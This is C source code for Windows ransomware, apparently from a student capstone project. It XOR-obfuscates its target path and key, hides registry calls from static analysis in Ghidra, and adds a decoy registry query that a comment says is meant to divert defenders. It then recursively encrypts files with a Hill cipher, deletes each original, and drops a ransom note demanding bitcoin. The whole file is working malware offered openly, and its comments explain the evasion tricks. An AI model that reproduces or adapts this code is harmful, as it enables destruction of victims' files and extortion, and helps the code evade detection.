#include <windows.h>
#include <tchar.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <errno.h>

#define MAX_FILENAME_LENGTH 256
#define MAX_KEY_LENGTH 16


void ls_dir(char *start_path,int num,char key1[num]);
void encryptfile(FILE *fpin, FILE *fpout, unsigned char *key);

int _tmain(int argc, _TCHAR *argv[])
{
    /*
    Please refer to Milestone 03 version 2 foe details on persistence related explainations.
    The start path is encoded with another random hex array. Then its decoded to get back the valid path. Doing this, start_path variable cannot be evidently seen in Ghidra.
    Similar technique is used for encryption key. Its XORed with another array to give string of 7 spaces (a blank string i.e, "_______"). This blank string is stored in Registy.
    Whenever a registry related API call is being made, HKEY_CURRENT_USER is passed as argument, which is evidently seen in Ghidra. Use of string array has been made to mask the visibility of the argument.
    */

    //char *start_path = "C:\\infected\\capstone";
    //string encoding using XOR operation
    char start_path[] = {67^0x12, 58^0x23, 92^0x34, 105^0x45, 110^0x56, 102^0x67, 101^0x78, 99^0x89, 116^0x9a, 101^0xab, 100^0xbc, 92^0xcd, 99^0xde, 97^0xef, 112^0xfe, 115^0xed, 116^0xdc, 111^0xcb, 110^0xba,101^0xbb,0};

    char key[] = {0x12, 0x23, 0x34, 0x45, 0x56, 0x67, 0x78, 0x89, 0x9a, 0xab, 0xbc, 0xcd, 0xde, 0xef, 0xfe, 0xed,0xdc,0xcb,0xba,0xbb};
int j=0;
for (int i = 0; i < sizeof(start_path); i++) {
    start_path[i] ^= key[i % 20];
    j=i;
}
start_path[j]='\0';

//printf("%s\n", start_path); // output: C:\infected\capstone

    HKEY hKey;
    LONG result;

    DWORD dwDisposition;
    LONG lRes;

//This is done to mask RegCreateKeyEx API call. So we do not see this API call in Ghidra.(during static analysis)
char hexStr[] = "0x80000001";
    unsigned int hex_val;

    // Convert the hex string to an integer
    sscanf(hexStr, "%x", &hex_val);
     // Create a new registry hive
     //Slitting strings into smaller pieces
    char reg_path[]="SOF" "TWAR" "E\\" "MyH" "ive";
    lRes = RegCreateKeyEx(
        (HKEY)hex_val,
        reg_path,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        &dwDisposition);

    if (lRes != ERROR_SUCCESS)
    {
        printf("Error creating registry key: %d\n", lRes);
        return 1;
    }

    // Store a text value in the new registry hive

    char key_obfc[] = {73^0x69, 78^0x6e, 70^0x66, 69^0x65, 67^0x63, 84^0x74, 69^0x65, 68^0x64,0};
    // key_obfc[]={0x20}*7 
    //0x20 corresponds to space in ASCII table.

    //key used for encoding
    char key1[] = {0x69, 0x6e, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64};
    int k=0;
    
key_obfc[8]='\0';
//printf("%d  this is\n",sizeof(key1));
char value[8];

    lRes = RegSetValueEx(
        hKey,
        " ",
        0,
        REG_SZ,
        (const BYTE *)value,
        sizeof(value));

    if (lRes != ERROR_SUCCESS)
    {
        printf("Error setting registry value: %d\n", lRes);
        return 1;
    }

    RegCloseKey(hKey);

    ls_dir(start_path,sizeof(key1),key1);
    return 0;
}

void ls_dir(char *start_path,int num, char key1[num])
{
    /*
    This function is responsible to decode the encryption key. Since we know that the encryption key value stored in Registry is seven 0x20s. Instead of retrieving, we can decode it with XORing with obfuscated key. 

    :param start_path: a pointer to a character array that represents the path of the directory to be searched.
    :param fpin: a pointer to the input file.
    :param fpout: a pointer to the output file.
    :param key[num]: an array of unsigned characters that represents the obfuscated encryption key.
    */
    
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize = MAX_KEY_LENGTH;
    char dwValue[MAX_KEY_LENGTH];
    char *keyPath = "SOFTWARE\\MyHive";
    char *keyName = " ";
    LONG lResult;
    char hexStr[] = "0x80000001";
    unsigned int hex_val;

    // Convert the hex string to an integer
    //Registry query is useless here. Just a diversion for defender.
    sscanf(hexStr, "%x", &hex_val);
    lResult = RegOpenKeyExA((HKEY)hex_val, keyPath, 0, KEY_QUERY_VALUE, &hKey);

    if (lResult == ERROR_SUCCESS)
    {
        // query the value of the registry key
        lResult = RegQueryValueExA(hKey, keyName, NULL, &dwType, (LPBYTE)dwValue, &dwSize);

        if (lResult == ERROR_SUCCESS && dwType == REG_SZ)
        {
            //printf("Registry value: %s\n", dwValue);
        }
        else
        {
            printf("Error querying registry value.\n");
        }
        RegCloseKey(hKey);

         char key[num]; // Create a VLA of size 5
    
    // Initialize the VLA
    for (int i = 0; i < num; i++) {
        key[i] = 0x20;
    }
        //strcpy(key, dwValue);
        int k;
        //printf("%d escn\n",num);
        for (int i = 0; i < num; i++) {
        //printf("%x _ %c init\n ",key[i],key[i]);
       key[i] ^= key1[i % num];
       //printf("%x _ %c later\n ",key[i],key[i]);
        k=i;
}
key[++k]='\0';

        DIR *dir;
        struct dirent *ent;
        if ((dir = opendir(start_path)) != NULL)
        {
            while ((ent = readdir(dir)) != NULL)
            {
                int len = strlen(ent->d_name);
                const char *last_four = &ent->d_name[len - 4];
                if (strcmp(last_four, ".enc") != 0)
                {
                    if (ent->d_type == DT_REG)
                    {

                        char *full_path_readme = (char *)malloc(strlen("RANSOMEWARE_INFO") + strlen(start_path) + 2);
                        strcpy(full_path_readme, start_path);
                        strcat(full_path_readme, "RANSOMEWARE_INFO");

                        char full_path[MAX_FILENAME_LENGTH];
                        strcpy(full_path, start_path);

                        strcat(full_path, "\\");
                        strcat(full_path, ent->d_name);
                        char new_name[MAX_FILENAME_LENGTH];
                        strcpy(new_name, full_path);
                        strcat(new_name, ".enc");
                        if (strcmp(full_path, "C:\\Windows\\System32\\config\\SAM") != 0 && strcmp(full_path, "C:\\Windows\\System32\\config\\SECURITY") != 0 && strcmp(full_path, "C:\\Windows\\System32\\config\\SOFTWARE") != 0)
                        {
                            FILE *fpin;
                            FILE *fpout;

                            FILE *fpreadme;
                            fpin = fopen(full_path, "rb");
                            fpout = fopen(new_name, "wb");
                            fpreadme = fopen(full_path_readme, "w");

                            fprintf(fpreadme, "You have been HACKED! \n\n Here All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Transfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:qwertyuiopasdfghjkl\n Email:infected02capstone@gmail.com \n");

                            encryptfile(fpin, fpout, key);

                            fclose(fpin);
                            fclose(fpout);
                            fclose(fpreadme);

                            int a = remove(full_path);
                        }
                    }
                    else if (ent->d_type == DT_DIR)
                    {
                        char full_path[MAX_FILENAME_LENGTH];
                        strcpy(full_path, start_path);
                        strcat(full_path, "\\");
                        strcat(full_path, ent->d_name);
                        strcat(full_path, "\\");
                        if (full_path != start_path && ent->d_name[0] != '.')
                        {
                            ls_dir(full_path,num,key1);
                        }
                    }
                }
            }
            closedir(dir);
        }
    }
}

void encryptfile(FILE * fpin, FILE * fpout, unsigned char *key)
    {
    /*
    Reads the contents from fpin, encrypts using Hill Cipher and writes the cipher text into only into first 4096 bytes of fpout.
    
    :param start_path: a pointer to a character array that represents the path of the directory to be searched.
    :param fpin: a pointer to the input file.
    :param fpout: a pointer to the output file.
    :param key: an array of unsigned characters that represents the encryption key.
    */
        
        // Using Hill Cipher to encrypt a file
        int k = strlen(key);
        // Generate the encryption matrix
        int matrix_size = k;
        int matrix[matrix_size][matrix_size];
        for (int i = 0; i < matrix_size; i++)
        {
            for (int j = 0; j < matrix_size; j++)
            {
                matrix[i][j] = key[(i + j) % k] - 'A';
            }
        }

        const unsigned bufsize = 4096;
        unsigned char *read_buf = malloc(bufsize);
        unsigned char *write_buf = malloc(bufsize);
        size_t bytes_read;
        int i, j, sum;
        int write_index = 0;

        if (fpin == NULL || fpout == NULL)
        {
            printf("Error: failed to open file.\n");
            return;
        }

        while ((bytes_read = fread(read_buf, sizeof(unsigned char), bufsize, fpin)) > 0)
        {
            for (i = 0; i < bytes_read; i += matrix_size)
            {
                for (j = 0; j < matrix_size; j++)
                {
                    sum = 0;
                    for (int k = 0; k < matrix_size; k++)
                    {
                        if (i + k < bytes_read)
                        {
                            sum += matrix[j][k] * read_buf[i + k];
                        }
                    }
                    write_buf[write_index++] = (unsigned char)(sum % 256);
                }
            }
            fwrite(write_buf, sizeof(unsigned char), write_index, fpout);
            write_index = 0;
        }
        free(read_buf);
        free(write_buf);
    }
    